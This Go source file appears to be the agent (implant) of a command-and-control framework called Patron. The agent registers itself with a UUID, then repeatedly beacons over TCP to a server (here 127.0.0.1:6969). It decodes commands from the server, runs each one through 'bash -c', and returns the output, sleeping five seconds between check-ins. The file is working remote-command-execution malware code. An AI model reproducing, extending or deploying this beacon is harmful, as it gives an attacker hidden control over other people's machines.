package main

import (
	"encoding/gob"
	"log"
	"net"
	"os/exec"
	"time"

	"github.com/google/uuid"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
	"github.com/s-christian/gollehs/lib/logger"
)

// func exec_command(text string) {

// }

func main() {
	Agentuuid := uuid.New().String()

	err := data.OpenDatabase()
	if err != nil {
		logger.Logf(logger.Info, "Error in DB\n")
		log.Fatalln(err)
	}
	data.CreateAgent(Agentuuid, "127.0.0.1", "5", "5")
	for {
		beacon, err := net.Dial("tcp", "127.0.0.1:6969")
		if err != nil {
			log.Fatalln(err) // maybe try diff IP
		}
		// fmt.Fprintf(beacon, "12344\n")
		_, _ = beacon.Write([]byte(Agentuuid + "\n"))
		// text, _ := bufio.NewReader(beacon).ReadString('\n')
		// message := strings.Split(text, "\n")
		// if message[0] == "Yes" {
		dec := gob.NewDecoder(beacon)
		encoder := gob.NewEncoder(beacon)
		logger.Logf(logger.Info, "Server Connected\n")
		instruct := &types.GiveAgentCommand{}
		logger.Logf(logger.Debug, "Struct formed\n")
		err = dec.Decode(instruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Received : %s\n", instruct)
		message1 := instruct.Command
		CmdOut := ""
		if message1 != "" {
			logger.Logf(logger.Debug, "Command to run : %s\n", message1)
			// tokens := strings.Split(message1, " ")
			var c *exec.Cmd
			c = exec.Command("bash", "-c", message1)
			// if len(tokens) == 1 {
			// 	c = exec.Command(tokens[0])
			// } else {
			// 	c = exec.Command(tokens[0], tokens[1:]...)
			// }
			buf, _ := c.CombinedOutput()
			if err != nil {
				CmdOut = err.Error()
			}
			CmdOut += string(buf)
			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
			// beacon.Write(buf)
		}
		destruct := types.GiveServerResult{
			Uuid:   "77777-777777-777777",
			Result: "whoami",
			Output: CmdOut,
		}
		err = encoder.Encode(destruct)
		if err != nil {
			log.Fatalln(err)
		}
		logger.Logf(logger.Debug, "Sent encoded struct\n")
		// } else {
		// 	logger.Logf(logger.Debug, "No Auth\n")
		// 	continue
		// }
		beacon.Close()
		time.Sleep(time.Second * 5) // interval and jitter here
	}

}
